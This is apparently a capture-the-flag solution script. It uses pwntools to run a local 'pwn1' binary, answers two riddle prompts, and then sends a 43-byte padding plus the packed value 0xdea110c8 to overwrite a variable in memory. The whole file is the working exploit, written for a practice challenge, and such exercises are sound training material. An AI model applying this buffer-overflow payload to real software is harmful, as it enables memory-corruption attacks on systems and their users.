# coding: utf-8
from pwn import *
p = process("./pwn_stuff/1basic_memory_overwrite/pwn1")
p.recv()
p.sendline("Sir Lancelot of Camelot")
p.recv()
p.sendline("To seek the Holy Grail.")
p.recv()
secret = b'a' * 43 + p32(0xdea110c8)
p.sendline(secret)
p.recv()
